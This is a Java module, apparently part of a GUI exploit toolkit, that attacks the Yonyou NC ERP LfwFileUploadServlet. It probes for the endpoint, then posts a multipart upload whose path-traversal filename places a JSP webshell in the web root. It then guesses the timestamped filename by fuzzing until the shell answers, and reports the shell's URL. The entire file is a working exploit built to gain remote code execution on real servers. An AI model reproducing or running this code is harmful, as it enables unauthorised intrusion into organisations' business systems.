package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

public class yongyou_nc_LfwFileUploadServlet_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private static String getRealStringValue(int value) {
        String realValue = String.valueOf(value);
        realValue = realValue.length() == 1 ? "0" + realValue : realValue;
        return realValue;
    }

    private static String getTime() {
        Calendar c = Calendar.getInstance();
        String y = String.valueOf(c.get(1));
        String m = getRealStringValue(c.get(2));
        String d = getRealStringValue(c.get(5));
        String h = getRealStringValue(c.get(10));
        String mi = getRealStringValue(c.get(12));
        String s = getRealStringValue(c.get(13));
        String ms = getRealStringValue(14);
        String time = y + m + d + h + mi + s + ms;
        return time;
    }

    public static String LfwFileUploadServlet_upload(String url,String filename,String shell){

        HashMap head = new HashMap();
        head.put("Content-Type","multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4");
        String data = "--e64bdf16c554bbc109cecef6451c26a4\r\n" +
                "Content-Disposition:form-data;name=\"handler\"\r\n" +
                "Content-Type:text/plain\r\n" +
                "\r\n" +
                "upload_handler\r\n" +
                "--e64bdf16c554bbc109cecef6451c26a4\r\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\""+filename+"\"\r\n" +
                "Content-Type:text/plain\r\n" +
                "\r\n" +
                shell+
                "\r\n" +
                "--e64bdf16c554bbc109cecef6451c26a4--";
        HttpTools.post(url+"/servlet/~ic/nc.uap.lfw.core.servlet.LfwFileUploadServlet",data,head,"utf-8");
        String t = getTime();
//        Platform.runLater(() -> {
            System.out.println("the time is : "+t);
            System.out.println("Fuzzing the filename by time.....");
//        });

        return t;
    }

    private Boolean att(String url, TextArea textArea) {
        Response get = HttpTools.get(url+"/servlet/~ic/nc.uap.lfw.core.servlet.LfwFileUploadServlet",new HashMap<>(),"utf-8");
            if ( get.getCode() != 404 && get.getCode() != 0) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_nc_LfwFileUploadServlet_upload ]");
                    textArea.appendText("\n 漏洞接口存在，由于时间戳不一致需fuzz时间较长,误报率高");
                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }
    }
    private boolean attcmd(String url, String pass, TextArea textArea,TextArea textArea_cmd) {
        try {
            String shell_payload = Methods.readFile(pass);
            long tt = (new Date()).getTime();
            String payload = tt + "\n" + shell_payload;
            String filename = "R4gS1.jsp";
            String t = LfwFileUploadServlet_upload(url, "../yonyou/home/webapps/nc_web/" + filename, payload);
            String flag = t.substring(11, 14);
            String var1 = "";
            String result = null;
            for (int i = Integer.parseInt(flag) - 5; i <= Integer.parseInt(flag) + 10; i += 1) {
                int number = i;
                var1 = "" + number;
                if (number < 100) {
                    var1 = "0" + number;
                }
                String sub = t.substring(0, 11) + var1 + t.substring(14, 16);
                String full = filename.substring(0, filename.lastIndexOf(".") - 1) + "_" + sub + filename.substring(filename.lastIndexOf("."));
                Response get = HttpTools.get(url + "/" + full, new HashMap<>(), "utf-8");
                Thread.sleep(5000);
                if (get.getCode() == 200) {
                    System.out.println(url + "/" + full + "\n" + get.getText());
                    result = url + "/" + full;
                    break;
                }
            }
            if (result != null) {
                String finalResult = result;
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: " + finalResult + "----" + tt);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }
        }catch (InterruptedException e) {
                return false;
            }
        }
}

